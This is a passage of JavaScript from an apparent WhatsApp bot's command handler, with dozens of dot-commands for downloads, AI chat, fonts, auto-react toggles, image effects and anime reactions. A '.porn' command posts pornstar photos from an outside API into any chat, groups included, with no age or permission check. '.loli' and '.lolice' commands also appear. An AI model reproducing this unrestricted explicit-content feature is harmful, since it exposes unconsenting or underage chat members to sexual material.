                await instagramCommand(sock, chatId, message);
                break;
            case userMessage.startsWith('.igsc'):
                await igsCommand(sock, chatId, message, true);
                break;
            case userMessage.startsWith('.igs'):
                await igsCommand(sock, chatId, message, false);
                break;
            case userMessage.startsWith('.fb') || userMessage.startsWith('.facebook'):
                await facebookCommand(sock, chatId, message);
                break;
            case userMessage.startsWith('.music'):
                await playCommand(sock, chatId, message);
                break;
            case userMessage.startsWith('.spotify'):
                await spotifyCommand(sock, chatId, message);
                break;
            case userMessage.startsWith('.play') || userMessage.startsWith('.song') || userMessage.startsWith('.mp3'):
    {
        const query = rawText.split(' ').slice(1).join(' ').trim();
        if (!query) {
            return await sock.sendMessage(chatId, { 
                text: "❌ *Please provide a name!*\nExample: `.play Tu Hai Kahan`" 
            }, { quoted: message });
        }
        await handleYtAudio(sock, chatId, message, query);
    }
    break;

                                        case userMessage.startsWith('.ytmp4'):
                {
                    const text = rawText.slice(6).trim(); 
                    const args = text.split(' ');
                    const url = args[0];
                    const directQuality = args[1];
                    if (!url || url === "") {
                        const usageText = 
`📝 *EXPLANS*
Use: \`.ytmp4 (link) (quality)\`
Example: \`.ytmp4 link 720p\`

📊 *USES*
Qualities: 360p, 480p, 720p, 1080p, max`;
                        return await sock.sendMessage(chatId, { text: usageText }, { quoted: message });
                    }

                    if (directQuality) {
                        const qualityVal = directQuality.replace('p', '');
                        const fakeMessage = {
                            key: message.key,
                            message: {
                                interactiveResponseMessage: {
                                    nativeFlowResponseMessage: {
                                        paramsJson: JSON.stringify({ id: `ytq|${qualityVal}|${url}` })
                                    }
                                }
                            }
                        };
                        await handleYtButton(sock, fakeMessage);
                    } else {
                        await ytmp4Preview(sock, chatId, message, url);
                    }
                }
                break;



            case userMessage.startsWith('.tiktok') || userMessage.startsWith('.tt'):
                await tiktokCommand(sock, chatId, message);
                break;
            case userMessage.startsWith('.gpt') || userMessage.startsWith('.gemini'):
                await aiCommand(sock, chatId, message);
                break;
            case userMessage.startsWith('.translate') || userMessage.startsWith('.trt'):
                const commandLength = userMessage.startsWith('.translate') ? 10 : 4;
                await handleTranslateCommand(sock, chatId, message, userMessage.slice(commandLength));
                return;
            case userMessage.startsWith('.ss') || userMessage.startsWith('.ssweb') || userMessage.startsWith('.screenshot'):
                const ssCommandLength = userMessage.startsWith('.screenshot') ? 11 : (userMessage.startsWith('.ssweb') ? 6 : 3);
                await handleSsCommand(sock, chatId, message, userMessage.slice(ssCommandLength).trim());
                break;
            case userMessage.startsWith('.areact') ||
     userMessage.startsWith('.autoreact') ||
     userMessage.startsWith('.autoreaction'): {

    if (!message.key.fromMe && !senderIsOwnerOrSudo) {
        await sock.sendMessage(chatId, {
            text: '❌ Owner / Sudo only command'
        }, { quoted: message });
        break;
    }

    const args = userMessage.split(' ').slice(1);
    const state = getAutoReactState(phoneNumber);

    if (!args[0]) {
        await sock.sendMessage(chatId, {
            text: `✨ AutoReact is *${state.enabled ? 'ON' : 'OFF'}*\n\nUse:\n.autoreact on\n.autoreact off`
        }, { quoted: message });
        break;
    }

    if (['on', 'enable'].includes(args[0])) {
        setAutoReactState(phoneNumber, true);
        await sock.sendMessage(chatId, {
            text: '✅ AutoReact ENABLED\n🔥 Now reacting on *ALL messages*'
        }, { quoted: message });
    } 
    else if (['off', 'disable'].includes(args[0])) {
        setAutoReactState(phoneNumber, false);
        await sock.sendMessage(chatId, {
            text: '❌ AutoReact DISABLED\n🛑 No reactions will be sent'
        }, { quoted: message });
    } 
    else {
        await sock.sendMessage(chatId, {
            text: '❌ Usage:\n.autoreact on\n.autoreact off'
        }, { quoted: message });
    }

    break;
}           case userMessage.startsWith('.font'): {
    const text = rawText.replace('.font', '').trim();

    if (!text) {
        await sock.sendMessage(chatId, {
            text: '❌ Usage:\n.font yourtext'
        }, { quoted: message });
        break;
    }

    const result = generateSYloveFonts(text);

    await sock.sendMessage(chatId, {
        text: `✨ *FONT STYLES*\n━━━━━━━━━━━━━━━\n${result}`
    }, { quoted: message });

    commandMatched = true;
    break;
}
            case userMessage.startsWith('.sudo'):
                await sudoCommand(sock, chatId, message);
                break;
            case userMessage === '.goodnight' || userMessage === '.lovenight' || userMessage === '.gn':
                await goodnightCommand(sock, chatId, message);
                break;
            case userMessage === '.shayari' || userMessage === '.shayri':
                await shayariCommand(sock, chatId, message);
                break;
            case userMessage === '.roseday':
                await rosedayCommand(sock, chatId, message);
                break;
            case userMessage.startsWith('.imagine') || userMessage.startsWith('.flux') || userMessage.startsWith('.dalle'): await imagineCommand(sock, chatId, message);
                break;
            case userMessage === '.jid': await groupJidCommand(sock, chatId, message);
                break;
            case userMessage.startsWith('.autotyping'):
                await autotypingCommand(sock, chatId, message);
                commandMatched = true;
                break;
            case userMessage.startsWith('.autoread'): {
    if (!message.key.fromMe && !senderIsOwnerOrSudo) {
        await sock.sendMessage(chatId, {
            text: '❌ Owner/Sudo only command'
        }, { quoted: message });
        break;
    }

    const args = userMessage.split(' ').slice(1);
    const state = getAutoreadState(phoneNumber);

    if (!args[0]) {
        await sock.sendMessage(chatId, {
            text: `📖 AutoRead is *${state.enabled ? 'ON' : 'OFF'}*\n\nUse:\n.autoread on\n.autoread off`
        }, { quoted: message });
        break;
    }

    if (['on', 'enable'].includes(args[0])) {
        setAutoreadState(phoneNumber, true);
        await sock.sendMessage(chatId, { text: '✅ AutoRead ENABLED' }, { quoted: message });
    } 
    else if (['off', 'disable'].includes(args[0])) {
        setAutoreadState(phoneNumber, false);
        await sock.sendMessage(chatId, { text: '❌ AutoRead DISABLED' }, { quoted: message });
    } 
    else {
        await sock.sendMessage(chatId, {
            text: '❌ Usage: .autoread on / off'
        }, { quoted: message });
    }

    commandMatched = true;
    break;
}
            case userMessage.startsWith('.heart'):
                await handleHeart(sock, chatId, message);
                break;
            case userMessage.startsWith('.horny'):
                {
                    const parts = userMessage.trim().split(/\s+/);
                    const args = ['horny', ...parts.slice(1)];
                    await miscCommand(sock, chatId, message, args);
                }
                break;
            case userMessage.startsWith('.circle'):
                {
                    const parts = userMessage.trim().split(/\s+/);
                    const args = ['circle', ...parts.slice(1)];
                    await miscCommand(sock, chatId, message, args);
                }
                break;
            case userMessage.startsWith('.lgbt'):
                {
                    const parts = userMessage.trim().split(/\s+/);
                    const args = ['lgbt', ...parts.slice(1)];
                    await miscCommand(sock, chatId, message, args);
                }
                break;
            case userMessage.startsWith('.lolice'):
                {
                    const parts = userMessage.trim().split(/\s+/);
                    const args = ['lolice', ...parts.slice(1)];
                    await miscCommand(sock, chatId, message, args);
                }
                break;
                case userMessage.startsWith('.porn'): {
    try {
        await sock.sendMessage(chatId, {
            text: "😳 *Searching hot content...*"
        }, { quoted: message });

        const star = await fetchRandomFemalePornstar();

        if (!star) {
            await sock.sendMessage(chatId, {
                text: "❌ No data found, try again later"
            }, { quoted: message });
            break;
        }

        const caption =
`🔥 *${star.pornStarName}*

> 𝒁𝑶𝑹𝑶 𝑴𝑫`;

        await sock.sendMessage(chatId, {
            image: { url: star.picture },
            caption,
            contextInfo: {
                externalAdReply: {
                    title: star.pornStarName,          
                    body: "Ohh S*** Mm 🤤",
                    thumbnailUrl: star.picture,
                    sourceUrl: "https://sabir7718.is-a.dev",
                    mediaType: 1,
                    renderLargerThumbnail: true
                }
            }
        }, { quoted: message });

        commandMatched = true;

    } catch (err) {
        console.error("Porn Command Error:", err);
        await sock.sendMessage(chatId, {
            text: "❌ API error, thoda baad try karo 😅"
        }, { quoted: message });
    }

    break;
}
            case userMessage.startsWith('.simpcard'):
                {
                    const parts = userMessage.trim().split(/\s+/);
                    const args = ['simpcard', ...parts.slice(1)];
                    await miscCommand(sock, chatId, message, args);
                }
                break;
            case userMessage.startsWith('.tonikawa'):
                {
                    const parts = userMessage.trim().split(/\s+/);
                    const args = ['tonikawa', ...parts.slice(1)];
                    await miscCommand(sock, chatId, message, args);
                }
                break;
            case userMessage.startsWith('.its-so-stupid'):
                {
                    const parts = userMessage.trim().split(/\s+/);
                    const args = ['its-so-stupid', ...parts.slice(1)];
                    await miscCommand(sock, chatId, message, args);
                }
                break;
            case userMessage.startsWith('.namecard'):
                {
                    const parts = userMessage.trim().split(/\s+/);
                    const args = ['namecard', ...parts.slice(1)];
                    await miscCommand(sock, chatId, message, args);
                }
                break;

            case userMessage.startsWith('.oogway2'):
            case userMessage.startsWith('.oogway'):
                {
                    const parts = userMessage.trim().split(/\s+/);
                    const sub = userMessage.startsWith('.oogway2') ? 'oogway2' : 'oogway';
                    const args = [sub, ...parts.slice(1)];
                    await miscCommand(sock, chatId, message, args);
                }
                break;
            case userMessage.startsWith('.tweet'):
                {
                    const parts = userMessage.trim().split(/\s+/);
                    const args = ['tweet', ...parts.slice(1)];
                    await miscCommand(sock, chatId, message, args);
                }
                break;
            case userMessage.startsWith('.ytcomment'):
                {
                    const parts = userMessage.trim().split(/\s+/);
                    const args = ['youtube-comment', ...parts.slice(1)];
                    await miscCommand(sock, chatId, message, args);
                }
                break;
            case userMessage.startsWith('.comrade'):
            case userMessage.startsWith('.gay'):
            case userMessage.startsWith('.glass'):
            case userMessage.startsWith('.jail'):
            case userMessage.startsWith('.passed'):
            case userMessage.startsWith('.triggered'):
                {
                    const parts = userMessage.trim().split(/\s+/);
                    const sub = userMessage.slice(1).split(/\s+/)[0];
                    const args = [sub, ...parts.slice(1)];
                    await miscCommand(sock, chatId, message, args);
                }
                break;
            case userMessage.startsWith('.animu'):
                {
                    const parts = userMessage.trim().split(/\s+/);
                    const args = parts.slice(1);
                    await animeCommand(sock, chatId, message, args);
                }
                break;
            // animu aliases
            case userMessage.startsWith('.nom'):
            case userMessage.startsWith('.poke'):
            case userMessage.startsWith('.cry'):
            case userMessage.startsWith('.kiss'):
            case userMessage.startsWith('.pat'):
            case userMessage.startsWith('.hug'):
            case userMessage.startsWith('.wink'):
            case userMessage.startsWith('.facepalm'):
            case userMessage.startsWith('.face-palm'):
            case userMessage.startsWith('.animuquote'):
            case userMessage.startsWith('.quote'):
            case userMessage.startsWith('.loli'):
                {
                    const parts = userMessage.trim().split(/\s+/);
                    let sub = parts[0].slice(1);
                    if (sub === 'facepalm') sub = 'face-palm';
                    if (sub === 'quote' || sub === 'animuquote') sub = 'quote';
                    await animeCommand(sock, chatId, message, [sub]);
                }
                break;
            case userMessage === '.crop':
                await stickercropCommand(sock, chatId, message);
                commandMatched = true;
                break;
            case userMessage.startsWith('.pies'):
                {
                    const parts = rawText.trim().split(/\s+/);
                    const args = parts.slice(1);
                    await piesCommand(sock, chatId, message, args);
                    commandMatched = true;
                }
                break;
            case userMessage === '.china':
                await piesAlias(sock, chatId, message, 'china');
                commandMatched = true;
                break;
            case userMessage === '.indonesia':
                await piesAlias(sock, chatId, message, 'indonesia');
                commandMatched = true;
                break;
            case userMessage === '.japan':
                await piesAlias(sock, chatId, message, 'japan');
                commandMatched = true;
                break;
            case userMessage === '.korea':
                await piesAlias(sock, chatId, message, 'korea');
                commandMatched = true;
                break;
            case userMessage === '.hijab':
                await piesAlias(sock, chatId, message, 'hijab');
                commandMatched = true;
                break;
            case userMessage.startsWith('.removebg') || userMessage.startsWith('.rmbg') || userMessage.startsWith('.nobg'):
                await removebgCommand.exec(sock, message, userMessage.split(' ').slice(1));
                break;
            case userMessage.startsWith('.remini') || userMessage.startsWith('.enhance') || userMessage.startsWith('.upscale'):
                await reminiCommand(sock, chatId, message, userMessage.split(' ').slice(1));
                break;
            case userMessage.startsWith('.sora'):
                await soraCommand(sock, chatId, message);
                
    if (isGroup) {
        if (userMessage) {
            await handleChatbotResponse(sock, chatId, message, userMessage, senderId);
        }
        await handleTagDetection(sock, chatId, message, senderId);
        await handleMentionDetection(sock, chatId, message);
    }
    commandMatched = false;
    break;
        }


        // Function to handle .groupjid command
        async function groupJidCommand(sock, chatId, message) {
            const groupJid = message.key.remoteJid;

            if (!groupJid.endsWith('@g.us')) {
                return await sock.sendMessage(chatId, {
                    text: "❌ This command can only be used in a group."
                });
            }

            await sock.sendMessage(chatId, {
                text: `✅ Group JID: ${groupJid}`
            }, {
                quoted: message
            });
        }
        // 🔥 AUTO REACTION AFTER COMMAND
if (commandMatched) {
    await addCommandReaction(sock, message);
}

        
    } catch (error) {
        console.error('❌ Error in message handler:', error.message);
        // Only try to send error message if we have a valid chatId
        if (chatId) {
            await sock.sendMessage(chatId, {
                text: '❌ Failed to process command!',
                ...channelInfo
            });
        }
    }
}

async function handleGroupParticipantUpdate(sock, update) {
    try {
        const { id, participants, action, author } = update;

        // Check if it's a group
        if (!id.endsWith('@g.us')) return;

        // Respect bot mode: only announce promote/demote in public mode
        let isPublic = true;
try {
    const botJid = sock.user?.id?.split('@')[0];
    const botPhone = global.botSessionMap?.get(botJid);

    const modeData = readSessionJSON(
        botPhone || 'default',
        'messageCount.json',
        { isPublic: true }
    );

    if (typeof modeData.isPublic === 'boolean') {
        isPublic = modeData.isPublic;
    }
} catch (e) {
    // fallback = public
}

        // Handle promotion events
        if (action === 'promote') {
            if (!isPublic) return;
            await handlePromotionEvent(sock, id, participants, author);
            return;
        }

        // Handle demotion events
        if (action === 'demote') {
            if (!isPublic) return;
            await handleDemotionEvent(sock, id, participants, author);
            return;
        }

        // Handle join events
        if (action === 'add') {
            await handleJoinEvent(sock, id, participants);
        }

        // Handle leave events
        if (action === 'remove') {
            await handleLeaveEvent(sock, id, participants);
        }
    } catch (error) {
        console.error('Error in handleGroupParticipantUpdate:', error);
    }
}


// Instead, export the handlers along with handleMessages
module.exports = {
    handleMessages,
    handleGroupParticipantUpdate,
    getAnticallState,
    handleAutoStatus
};